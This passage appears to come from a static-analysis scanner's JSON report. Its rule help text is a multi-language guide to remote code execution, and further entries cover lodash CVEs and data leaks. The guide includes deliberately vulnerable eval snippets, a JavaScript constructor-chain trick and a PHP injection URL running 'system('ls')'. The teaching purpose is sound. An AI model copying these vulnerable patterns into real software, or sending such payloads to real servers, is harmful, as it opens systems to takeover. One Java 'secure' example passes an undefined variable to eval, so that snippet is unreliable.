Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**",
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
                            "id": "warning-sink-execute-code/da3d6741cca13a8481a55cd99e75da83",
                            "name": "Remote Code Execution: Execution Of Non-Constant Code In Server.js:<Lambda>0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8.5",
                                    "CWE 94",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a1-injection",
                                    "Remote Code Execution"
                                ]
                            },
                            "shortDescription": {
                                "text": "Remote Code Execution: Execution of Non-Constant Code in server.js:<lambda>0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions."
                            },
                            "help": {
                                "markdown": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions.",
                                "text": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/cc27529773d986ff0a229334f36b3722",
                            "name": "Pkg:npm/Lodash@4.17.15",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.3",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2020-28500",
                                    "CVSS 5.3",
                                    "CWE 1035",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/lodash@4.17.15"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Command Injection via template."
                            },
                            "help": {
                                "markdown": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Command Injection via template.",
                                "text": "All versions of package lodash; all versions of package `org.fujion.webjars:lodash` is vulnerable to Command Injection via template."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/f5b8b6fffcbce6101d10553edf66d1d0",
                            "name": "Pkg:npm/Lodash@4.17.15",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.2",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2021-23337",
                                    "CVSS 7.2",
                                    "CWE 1035",
                                    "CWE 937",
                                    "CWE 94",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/lodash@4.17.15"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup 